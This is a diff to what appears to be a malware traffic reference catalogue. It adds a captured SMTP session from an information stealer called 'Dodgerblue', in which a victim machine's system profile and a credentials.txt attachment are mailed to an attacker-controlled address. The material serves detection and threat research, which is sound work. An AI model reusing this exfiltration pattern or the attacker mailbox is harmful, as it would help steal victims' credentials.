@@ -949,6 +949,70 @@ y.}.b.g.g.d.m.i.n.k!S.R"Q.U-Z,O-_c\6E3A1F0C9K?H:I?M..................K..........
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/diamondfox.png "Diamondfox")
 
+#### Dodgerblue
+~~~
+MAIL FROM: <e-sail@bojtai.xyz>
+250 OK
+RCPT TO: <e-sail@bojtai.xyz>
+250 Accepted
+DATA
+354 Enter message, ending with "." on a line by itself
+thread-index: AdeYjY9JWfNpH2aQRTCt4pdvmqBa0w==
+Thread-Topic: Passwords:::JOHNS-PC\cep2solilJZGK
+From: "abadia firmhearted" <e-sail@bojtai.xyz>
+To: <e-sail@bojtai.xyz>
+Subject: Passwords:::JOHNS-PC\cep2solilJZGK
+Date: Mon, 23 Aug 2021 19:13:00 -0700
+Message-ID: <870B54DC128A4D2CADAF814D7EBD6F47@SXQUR6787287963>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0000_01D79852.E3EBF170"
+X-Mailer: Microsoft CDO for Windows 2000
+Content-Class: urn:content-classes:message
+Importance: normal
+Priority: normal
+X-MimeOLE: Produced By Microsoft MimeOLE V6.1.7601.17514
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0000_01D79852.E3EBF170
+Content-Type: text/plain
+Content-Transfer-Encoding: 7bit
+
+Date: 2021-08-23 7:12:48 PM
+System: Microsoft Windows NT 6.1.7601 Service Pack 1 (64 Bit)
+Username: cep2solilJZGK
+CompName: SXQUR6787287963
+Windows Version: Microsoft Windows 7 Professional  - 64-bit
+Antivirus: Not installed
+CPU: Intel(R) Core(TM) i7-4770 CPU @ 3.40GHz
+GPU: Standard VGA Graphics Adapter
+RAM: 2004MB
+Internal IP: 192.168.180.141
+External IP: 104.244.72.168
+
+Date: 2021-08-23 7:12:49 PM
+System: Microsoft Windows NT 6.1.7601 Service Pack 1 (64 Bit)
+Username: cep2solilJZGK
+CompName: SXQUR6787287963
+Windows Version: Microsoft Windows 7 Professional  - 64-bit
+Antivirus: Not installed
+CPU: Intel(R) Core(TM) i7-4770 CPU @ 3.40GHz
+GPU: Standard VGA Graphics Adapter
+RAM: 2004MB
+Internal IP: 192.168.180.141
+External IP: 104.244.72.168
+
+
+------=_NextPart_000_0000_01D79852.E3EBF170
+Content-Type: text/plain;
+	name="credentials.txt"
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment;
+	filename="credentials.txt"
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/dodgerblue.png "DodgerBlue")
+
 #### Donotgroup
 ~~~
 POST /ze/volad/uzi HTTP/1.1
